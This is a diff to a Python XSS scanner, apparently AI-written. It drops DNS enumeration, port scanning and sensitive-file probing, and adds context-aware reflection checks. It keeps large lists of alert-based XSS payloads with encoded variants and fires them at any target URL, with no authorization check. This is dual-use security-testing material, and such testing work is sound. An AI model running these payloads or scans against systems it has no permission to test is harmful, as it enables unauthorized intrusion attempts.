@@ -1,19 +1,17 @@
 #!/usr/bin/env python3
 """
-Advanced XSS Scanner with Deep Reconnaissance
+Advanced XSS Scanner - Focused on XSS Testing
 Author: AI Assistant
-Description: A comprehensive XSS scanner that performs deep reconnaissance and advanced XSS testing
+Description: A focused XSS scanner that performs targeted reconnaissance and advanced XSS testing
 """
 
 import requests
-import re
 import json
 import time
 import random
 import string
 import base64
 import urllib.parse
-import subprocess
 import os
 import sys
 from urllib.parse import urljoin, urlparse, parse_qs
@@ -29,8 +27,6 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 from datetime import datetime
 import hashlib
-import dns.resolver
-import socket
 
 # Configure logging
 logging.basicConfig(
@@ -56,10 +52,10 @@ class Colors:
     UNDERLINE = '\033[4m'
     END = '\033[0m'
 
-class DeepReconnaissance:
-    """Deep reconnaissance module for comprehensive target analysis"""
+class XSSReconnaissance:
+    """XSS-focused reconnaissance module for finding XSS testing points"""
     
-    def __init__(self, target_url, max_depth=3, max_threads=10):
+    def __init__(self, target_url, max_depth=2, max_threads=10):
         self.target_url = target_url
         self.max_depth = max_depth
         self.max_threads = max_threads
@@ -71,9 +67,7 @@ class DeepReconnaissance:
         self.discovered_urls = set()
         self.forms = []
         self.parameters = set()
-        self.subdomains = set()
-        self.technologies = set()
-        self.sensitive_files = []
+        self.xss_points = []
         
     def print_banner(self):
         """Print the scanner banner"""
@@ -89,68 +83,23 @@ Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END
 """
         print(banner)
     
-    def dns_enumeration(self):
-        """Perform DNS enumeration and subdomain discovery"""
-        logger.info(f"{Colors.BLUE}[RECON] Starting DNS enumeration...{Colors.END}")
+    def find_xss_points(self):
+        """Find potential XSS testing points"""
+        logger.info(f"{Colors.BLUE}[RECON] Finding XSS testing points...{Colors.END}")
         
-        domain = urlparse(self.target_url).netloc
-        if ':' in domain:
-            domain = domain.split(':')[0]
+        # Start with the main target URL
+        self.discovered_urls.add(self.target_url)
         
-        # Common subdomain wordlist
-        subdomain_wordlist = [
-            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
-            'blog', 'shop', 'store', 'app', 'mobile', 'secure', 'portal',
-            'support', 'help', 'docs', 'wiki', 'forum', 'community',
-            'cdn', 'static', 'assets', 'media', 'images', 'files',
-            'backup', 'old', 'legacy', 'beta', 'alpha', 'demo'
-        ]
+        # Crawl to find forms and parameters
+        self.web_crawling()
         
-        # DNS record types to check
-        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'TXT', 'NS']
-        
-        for subdomain in subdomain_wordlist:
-            full_domain = f"{subdomain}.{domain}"
-            try:
-                # Check A record
-                result = dns.resolver.resolve(full_domain, 'A')
-                for ip in result:
-                    self.subdomains.add(full_domain)
-                    logger.info(f"{Colors.GREEN}[DNS] Found subdomain: {full_domain} -> {ip}{Colors.END}")
-            except:
-                pass
-        
-        # Check for wildcard DNS
-        try:
-            random_subdomain = f"{''.join(random.choices(string.ascii_lowercase, k=10))}.{domain}"
-            dns.resolver.resolve(random_subdomain, 'A')
-            logger.warning(f"{Colors.YELLOW}[DNS] Wildcard DNS detected for {domain}{Colors.END}")
-        except:
-            pass
-    
-    def port_scanning(self):
-        """Perform port scanning on discovered hosts"""
-        logger.info(f"{Colors.BLUE}[RECON] Starting port scanning...{Colors.END}")
-        
-        # Common web ports
-        web_ports = [80, 443, 8080, 8443, 8000, 8008, 8888, 3000, 5000, 9000]
-        
-        for subdomain in self.subdomains:
-            try:
-                ip = socket.gethostbyname(subdomain)
-                for port in web_ports:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    result = sock.connect_ex((ip, port))
-                    if result == 0:
-                        logger.info(f"{Colors.GREEN}[PORT] {subdomain}:{port} is open{Colors.END}")
-                    sock.close()
-            except:
-                pass
+        # Extract XSS testing points
+        for url in self.discovered_urls:
+            self.analyze_url_for_xss(url)
     
     def web_crawling(self):
-        """Perform comprehensive web crawling"""
-        logger.info(f"{Colors.BLUE}[RECON] Starting web crawling...{Colors.END}")
+        """Crawl website to find XSS testing points"""
+        logger.info(f"{Colors.BLUE}[RECON] Crawling for XSS points...{Colors.END}")
         
         urls_to_visit = [self.target_url]
         depth = 0
@@ -160,7 +109,7 @@ Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END
             urls_to_visit.clear()
             depth += 1
             
-            logger.info(f"{Colors.CYAN}[CRAWL] Crawling depth {depth} - {len(current_urls)} URLs{Colors.END}")
+            logger.info(f"{Colors.CYAN}[CRAWL] Depth {depth} - {len(current_urls)} URLs{Colors.END}")
             
             with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                 futures = {executor.submit(self.crawl_url, url): url for url in current_urls}
@@ -173,7 +122,7 @@ Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END
                         self.forms.extend(forms)
                         self.parameters.update(params)
                     except Exception as e:
-                        logger.error(f"{Colors.RED}[CRAWL] Error crawling {url}: {str(e)}{Colors.END}")
+                        logger.error(f"{Colors.RED}[CRAWL] Error: {str(e)}{Colors.END}")
     
     def crawl_url(self, url):
         """Crawl a single URL and extract information"""
@@ -261,68 +210,61 @@ Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END
         
         return form_data if form_data['inputs'] else None
     
-    def detect_technologies(self, response, soup):
-        """Detect web technologies and frameworks"""
-        # Server headers
-        server_header = response.headers.get('Server', '').lower()
-        if 'apache' in server_header:
-            self.technologies.add('Apache')
-        elif 'nginx' in server_header:
-            self.technologies.add('Nginx')
-        elif 'iis' in server_header:
-            self.technologies.add('IIS')
-        
-        # X-Powered-By header
-        powered_by = response.headers.get('X-Powered-By', '').lower()
-        if powered_by:
-            self.technologies.add(powered_by)
-        
-        # Meta tags
-        for meta in soup.find_all('meta'):
-            if meta.get('name') == 'generator':
-                self.technologies.add(meta.get('content', ''))
-        
-        # Script sources
-        for script in soup.find_all('script', src=True):
-            src = script['src'].lower()
-            if 'jquery' in src:
-                self.technologies.add('jQuery')
-            elif 'bootstrap' in src:
-                self.technologies.add('Bootstrap')
-            elif 'angular' in src:
-                self.technologies.add('Angular')
-            elif 'react' in src:
-                self.technologies.add('React')
-            elif 'vue' in src:
-                self.technologies.add('Vue.js')
-    
-    def find_sensitive_files(self, url, soup):
-        """Look for sensitive files and directories"""
-        sensitive_patterns = [
-            'admin', 'login', 'config', 'backup', 'test', 'dev',
-            'phpinfo', 'info.php', 'test.php', 'debug.php',
-            '.env', '.git', '.svn', 'robots.txt', 'sitemap.xml'
-        ]
-        
-        base_url = url.rstrip('/')
-        
-        for pattern in sensitive_patterns:
-            test_urls = [
-                f"{base_url}/{pattern}",
-                f"{base_url}/{pattern}.php",
-                f"{base_url}/{pattern}.html",
-                f"{base_url}/{pattern}.txt",
-                f"{base_url}/.{pattern}"
-            ]
+    def analyze_url_for_xss(self, url):
+        """Analyze URL for potential XSS points"""
+        try:
+            response = self.session.get(url, timeout=10)
+            soup = BeautifulSoup(response.content, 'html.parser')
             
-            for test_url in test_urls:
-                try:
-                    response = self.session.head(test_url, timeout=5)
-                    if response.status_code == 200:
-                        self.sensitive_files.append(test_url)
-                        logger.info(f"{Colors.YELLOW}[SENSITIVE] Found: {test_url}{Colors.END}")
-                except:
-                    pass
+            # Check for reflected parameters
+            parsed_url = urlparse(url)
+            if parsed_url.query:
+                query_params = parse_qs(parsed_url.query)
+                for param in query_params.keys():
+                    # Test if parameter is reflected
+                    test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
+                    test_url = url.replace(param + "=" + query_params[param][0], param + "=" + test_value)
+                    
+                    try:
+                        test_response = self.session.get(test_url, timeout=5)
+                        if test_value in test_response.text:
+                            self.xss_points.append({
+                                'url': url,
+                                'parameter': param,
+                                'method': 'GET',
+                                'context': self.detect_context_from_response(test_response, test_value)
+                            })
+                            logger.info(f"{Colors.GREEN}[XSS_POINT] Found: {url}?{param}={Colors.END}")
+                    except:
+                        pass
+        except:
+            pass
+    
+    def detect_context_from_response(self, response, test_value):
+        """Detect context where test value is reflected"""
+        soup = BeautifulSoup(response.content, 'html.parser')
+        
+        # Check HTML context
+        if test_value in response.text:
+            for tag in soup.find_all():
+                if test_value in str(tag):
+                    # Check if it's in an attribute
+                    for attr_name, attr_value in tag.attrs.items():
+                        if test_value in str(attr_value):
+                            return 'attribute'
+                    return 'html'
+        
+        # Check JavaScript context
+        for script in soup.find_all('script'):
+            if test_value in script.string:
+                return 'javascript'
+        
+        # Check CSS context
+        for style in soup.find_all('style'):
+            if test_value in style.string:
+                return 'css'
+        
+        return 'html'  # Default
     
     def is_valid_url(self, url):
         """Check if URL is valid and within scope"""
@@ -348,35 +290,32 @@ Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END
             return False
     
     def generate_report(self):
-        """Generate reconnaissance report"""
+        """Generate XSS reconnaissance report"""
         report = {
             'target': self.target_url,
             'timestamp': datetime.now().isoformat(),
-            'subdomains': list(self.subdomains),
             'discovered_urls': list(self.discovered_urls),
             'forms': self.forms,
             'parameters': list(self.parameters),
-            'technologies': list(self.technologies),
-            'sensitive_files': self.sensitive_files,
+            'xss_points': self.xss_points,
             'total_urls': len(self.discovered_urls),
             'total_forms': len(self.forms),
-            'total_parameters': len(self.parameters)
+            'total_parameters': len(self.parameters),
+            'total_xss_points': len(self.xss_points)
         }
         
         # Save report to file
-        with open('recon_report.json', 'w') as f:
+        with open('xss_recon_report.json', 'w') as f:
             json.dump(report, f, indent=2)
         
         # Print summary
-        print(f"\n{Colors.GREEN}{Colors.BOLD}=== RECONNAISSANCE SUMMARY ==={Colors.END}")
+        print(f"\n{Colors.GREEN}{Colors.BOLD}=== XSS RECONNAISSANCE SUMMARY ==={Colors.END}")
         print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
-        print(f"{Colors.CYAN}Subdomains found: {len(self.subdomains)}{Colors.END}")
         print(f"{Colors.CYAN}URLs discovered: {len(self.discovered_urls)}{Colors.END}")
         print(f"{Colors.CYAN}Forms found: {len(self.forms)}{Colors.END}")
         print(f"{Colors.CYAN}Parameters found: {len(self.parameters)}{Colors.END}")
-        print(f"{Colors.CYAN}Technologies: {', '.join(self.technologies)}{Colors.END}")
-        print(f"{Colors.CYAN}Sensitive files: {len(self.sensitive_files)}{Colors.END}")
-        print(f"{Colors.GREEN}Report saved to: recon_report.json{Colors.END}\n")
+        print(f"{Colors.CYAN}XSS testing points: {len(self.xss_points)}{Colors.END}")
+        print(f"{Colors.GREEN}Report saved to: xss_recon_report.json{Colors.END}\n")
         
         return report
 
@@ -409,10 +348,10 @@ class AdvancedXSSScanner:
             logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver: {str(e)}{Colors.END}")
             self.driver = None
     
-    def generate_payloads(self):
-        """Generate comprehensive XSS payloads for different contexts"""
+    def generate_payloads_for_context(self, context):
+        """Generate XSS payloads specific to the detected context"""
         payloads = {
-            'html_context': [
+            'html': [
                 '<script>alert("XSS")</script>',
                 '<img src=x onerror=alert("XSS")>',
                 '<svg onload=alert("XSS")>',
@@ -429,12 +368,11 @@ class AdvancedXSSScanner:
                 '<select onfocus=alert("XSS") autofocus>',
                 '<textarea onfocus=alert("XSS") autofocus>',
                 '<keygen onfocus=alert("XSS") autofocus>',
-                '<video><source onerror="alert(\'XSS\')">',
                 '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                 '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
                 '<embed src="data:text/html,<script>alert(\'XSS\')</script>">'
             ],
-            'attribute_context': [
+            'attribute': [
                 '" onmouseover="alert(\'XSS\')"',
                 '" onfocus="alert(\'XSS\')" autofocus="',
                 '" onload="alert(\'XSS\')"',
@@ -456,7 +394,7 @@ class AdvancedXSSScanner:
                 '" onmouseleave="alert(\'XSS\')"',
                 '" ondblclick="alert(\'XSS\')"'
             ],
-            'javascript_context': [
+            'javascript': [
                 ';alert("XSS");',
                 '";alert("XSS");//',
                 "';alert('XSS');//",
@@ -478,7 +416,7 @@ class AdvancedXSSScanner:
                 '^alert("XSS");',
                 '~alert("XSS");'
             ],
-            'css_context': [
+            'css': [
                 'expression(alert("XSS"))',
                 'url("javascript:alert(\'XSS\')")',
                 'url("data:text/html,<script>alert(\'XSS\')</script>")',
@@ -490,7 +428,7 @@ class AdvancedXSSScanner:
                 'url("onfocus=alert(\'XSS\')")',
                 'url("onblur=alert(\'XSS\')")'
             ],
-            'url_context': [
+            'url': [
                 'javascript:alert("XSS")',
                 'data:text/html,<script>alert("XSS")</script>',
                 'vbscript:alert("XSS")',
@@ -504,28 +442,101 @@ class AdvancedXSSScanner:
             ]
         }
         
+        # Get base payloads for the context
+        base_payloads = payloads.get(context, payloads['html'])
+        
         # Add encoded variations
         encoded_payloads = []
-        for context, payload_list in payloads.items():
-            for payload in payload_list:
-                # URL encoding
-                encoded_payloads.append(urllib.parse.quote(payload))
-                # HTML entity encoding
-                encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'))
-                # Base64 encoding
-                try:
-                    encoded_payloads.append(base64.b64encode(payload.encode()).decode())
-                except:
-                    pass
-                # Unicode encoding
-                unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
-                encoded_payloads.append(unicode_payload)
+        for payload in base_payloads:
+            # URL encoding
+            encoded_payloads.append(urllib.parse.quote(payload))
+            # HTML entity encoding
+            encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'))
+            # Base64 encoding
+            try:
+                encoded_payloads.append(base64.b64encode(payload.encode()).decode())
+            except:
+                pass
+            # Unicode encoding
+            unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
+            encoded_payloads.append(unicode_payload)
         
-        # Add all encoded payloads to their respective contexts
-        for context in payloads:
-            payloads[context].extend(encoded_payloads)
+        # Combine base and encoded payloads
+        all_payloads = base_payloads + encoded_payloads
         
-        return payloads
+        return all_payloads
+    
+    def detect_form_context(self, url, parameter):
+        """Detect context for form parameters"""
+        try:
+            # Send a test request to detect context
+            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
+            test_data = {parameter: test_value}
+            
+            response = self.session.post(url, data=test_data, timeout=10)
+            
+            # Check where the test value is reflected
+            if test_value in response.text:
+                soup = BeautifulSoup(response.content, 'html.parser')
+                
+                # Check HTML context
+                for tag in soup.find_all():
+                    if test_value in str(tag):
+                        # Check if it's in an attribute
+                        for attr_name, attr_value in tag.attrs.items():
+                            if test_value in str(attr_value):
+                                return 'attribute'
+                        return 'html'
+                
+                # Check JavaScript context
+                for script in soup.find_all('script'):
+                    if test_value in script.string:
+                        return 'javascript'
+                
+                # Check CSS context
+                for style in soup.find_all('style'):
+                    if test_value in style.string:
+                        return 'css'
+            
+            return 'html'  # Default
+        except:
+            return 'html'  # Default
+    
+    def detect_url_context(self, url, parameter):
+        """Detect context for URL parameters"""
+        try:
+            # Send a test request to detect context
+            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
+            test_url = url.replace(parameter + "=" + parse_qs(urlparse(url).query)[parameter][0], parameter + "=" + test_value)
+            
+            response = self.session.get(test_url, timeout=10)
+            
+            # Check where the test value is reflected
+            if test_value in response.text:
+                soup = BeautifulSoup(response.content, 'html.parser')
+                
+                # Check HTML context
+                for tag in soup.find_all():
+                    if test_value in str(tag):
+                        # Check if it's in an attribute
+                        for attr_name, attr_value in tag.attrs.items():
+                            if test_value in str(attr_value):
+                                return 'attribute'
+                        return 'html'
+                
+                # Check JavaScript context
+                for script in soup.find_all('script'):
+                    if test_value in script.string:
+                        return 'javascript'
+                
+                # Check CSS context
+                for style in soup.find_all('style'):
+                    if test_value in style.string:
+                        return 'css'
+            
+            return 'html'  # Default
+        except:
+            return 'html'  # Default
     
     def detect_context(self, url, parameter, response):
         """Detect the context where user input is reflected"""
@@ -639,8 +650,6 @@ class AdvancedXSSScanner:
         """Scan forms for XSS vulnerabilities"""
         logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['forms'])} forms...{Colors.END}")
         
-        payloads = self.generate_payloads()
-        
         for form in self.recon_data['forms']:
             logger.info(f"{Colors.CYAN}[FORM] Testing form: {form['action']}{Colors.END}")
             
@@ -648,46 +657,50 @@ class AdvancedXSSScanner:
                 if input_field['type'] in ['text', 'textarea', 'search', 'email', 'url']:
                     parameter = input_field['name']
                     
-                    # Test different contexts
-                    for context, context_payloads in payloads.items():
-                        for payload in context_payloads[:10]:  # Limit to first 10 payloads per context
-                            is_vulnerable, response = self.test_xss(
-                                form['action'], parameter, payload, context
-                            )
-                            
-                            if is_vulnerable:
-                                vulnerability = {
-                                    'type': 'XSS',
-                                    'url': form['action'],
-                                    'parameter': parameter,
-                                    'payload': payload,
-                                    'context': context,
-                                    'method': form['method'],
-                                    'severity': 'High',
-                                    'timestamp': datetime.now().isoformat()
-                                }
-                                
-                                # Capture screenshot
-                                screenshot = self.capture_screenshot(form['action'], payload, parameter)
-                                if screenshot:
-                                    vulnerability['screenshot'] = screenshot
-                                
-                                self.vulnerabilities.append(vulnerability)
-                                
-                                logger.info(f"{Colors.GREEN}[VULN] XSS found in {form['action']} parameter: {parameter}{Colors.END}")
-                                logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
-                                
-                                # Break after first successful payload
-                                break
+                    # Detect context first
+                    context = self.detect_form_context(form['action'], parameter)
+                    
+                    # Get payloads specific to this context
+                    payloads = self.generate_payloads_for_context(context)
+                    
+                    # Test payloads for this specific context
+                    for payload in payloads[:20]:  # Limit to first 20 payloads
+                        is_vulnerable, response = self.test_xss(
+                            form['action'], parameter, payload, context
+                        )
                         
                         if is_vulnerable:
+                            vulnerability = {
+                                'type': 'XSS',
+                                'url': form['action'],
+                                'parameter': parameter,
+                                'payload': payload,
+                                'context': context,
+                                'method': form['method'],
+                                'severity': 'High',
+                                'timestamp': datetime.now().isoformat()
+                            }
+                            
+                            # Capture screenshot
+                            screenshot = self.capture_screenshot(form['action'], payload, parameter)
+                            if screenshot:
+                                vulnerability['screenshot'] = screenshot
+                            
+                            self.vulnerabilities.append(vulnerability)
+                            
+                            logger.info(f"{Colors.GREEN}[VULN] XSS found in {form['action']} parameter: {parameter}{Colors.END}")
+                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
+                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
+                            
+                            # Break after first successful payload
                             break
+                    
+                    if is_vulnerable:
+                        break
     
     def scan_urls(self):
         """Scan URLs for XSS vulnerabilities"""
         logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['discovered_urls'])} URLs...{Colors.END}")
-        
-        payloads = self.generate_payloads()
         
         for url in self.recon_data['discovered_urls']:
             if '?' in url:
@@ -698,38 +711,44 @@ class AdvancedXSSScanner:
                 for parameter in query_params.keys():
                     logger.info(f"{Colors.CYAN}[URL] Testing {url} parameter: {parameter}{Colors.END}")
                     
-                    # Test different contexts
-                    for context, context_payloads in payloads.items():
-                        for payload in context_payloads[:5]:  # Limit to first 5 payloads per context
-                            is_vulnerable, response = self.test_xss(url, parameter, payload, context)
-                            
-                            if is_vulnerable:
-                                vulnerability = {
-                                    'type': 'XSS',
-                                    'url': url,
-                                    'parameter': parameter,
-                                    'payload': payload,
-                                    'context': context,
-                                    'method': 'GET',
-                                    'severity': 'High',
-                                    'timestamp': datetime.now().isoformat()
-                                }
-                                
-                                # Capture screenshot
-                                screenshot = self.capture_screenshot(url, payload, parameter)
-                                if screenshot:
-                                    vulnerability['screenshot'] = screenshot
-                                
-                                self.vulnerabilities.append(vulnerability)
-                                
-                                logger.info(f"{Colors.GREEN}[VULN] XSS found in {url} parameter: {parameter}{Colors.END}")
-                                logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
-                                
-                                # Break after first successful payload
-                                break
+                    # Detect context first
+                    context = self.detect_url_context(url, parameter)
+                    
+                    # Get payloads specific to this context
+                    payloads = self.generate_payloads_for_context(context)
+                    
+                    # Test payloads for this specific context
+                    for payload in payloads[:15]:  # Limit to first 15 payloads
+                        is_vulnerable, response = self.test_xss(url, parameter, payload, context)
                         
                         if is_vulnerable:
+                            vulnerability = {
+                                'type': 'XSS',
+                                'url': url,
+                                'parameter': parameter,
+                                'payload': payload,
+                                'context': context,
+                                'method': 'GET',
+                                'severity': 'High',
+                                'timestamp': datetime.now().isoformat()
+                            }
+                            
+                            # Capture screenshot
+                            screenshot = self.capture_screenshot(url, payload, parameter)
+                            if screenshot:
+                                vulnerability['screenshot'] = screenshot
+                            
+                            self.vulnerabilities.append(vulnerability)
+                            
+                            logger.info(f"{Colors.GREEN}[VULN] XSS found in {url} parameter: {parameter}{Colors.END}")
+                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
+                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
+                            
+                            # Break after first successful payload
                             break
+                    
+                    if is_vulnerable:
+                        break
     
     def generate_xss_report(self):
         """Generate XSS vulnerability report"""
@@ -780,15 +799,13 @@ def main():
     
     target_url = sys.argv[1]
     
-    # Phase 1: Deep Reconnaissance
-    print(f"{Colors.BLUE}{Colors.BOLD}=== PHASE 1: DEEP RECONNAISSANCE ==={Colors.END}")
-    recon = DeepReconnaissance(target_url)
+    # Phase 1: XSS Reconnaissance
+    print(f"{Colors.BLUE}{Colors.BOLD}=== PHASE 1: XSS RECONNAISSANCE ==={Colors.END}")
+    recon = XSSReconnaissance(target_url)
     recon.print_banner()
     
     try:
-        recon.dns_enumeration()
-        recon.port_scanning()
-        recon.web_crawling()
+        recon.find_xss_points()
         recon_data = recon.generate_report()
     except KeyboardInterrupt:
         print(f"\n{Colors.YELLOW}[INFO] Reconnaissance interrupted by user{Colors.END}")
